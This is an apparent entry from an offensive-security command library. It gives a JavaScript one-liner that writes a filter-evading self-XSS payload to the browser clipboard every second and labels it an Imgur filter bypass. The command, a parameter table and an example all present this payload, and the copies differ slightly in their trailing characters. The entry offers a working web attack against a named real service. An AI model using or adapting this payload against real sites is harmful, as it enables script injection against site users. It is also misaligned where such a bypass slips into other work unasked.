---
id: cmd-clipboard-self-xss
data: >-
  setInterval(function(){navigator.clipboard.writeText("<<!<script>iframe
  src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})},1000)
tags:
  - self-xss
  - clipboard
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.844Z'
verified: false
validated: true
submitted: true
---
# clipboard-write-self-xss

## Command

```javascript
setInterval(function(){navigator.clipboard.writeText("<<!<script>iframe src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})},1000)
```

## Description

Specific implementation writing the self-XSS payload to clipboard every second for Imgur bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | "<<!<script>iframe src=javajavascriptscript:alert(document.domain)>>" | Yes |
| interval | 1000 | Yes |

## Examples

### Basic Usage

```javascript
setInterval(function(){navigator.clipboard.writeText("<<!<script>iframe src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})},1000)
```

## Expected Output

Payload written to clipboard; logs success.

## Related

- [[procedures/Inject-and-Execute-Self-XSS-Payload]]
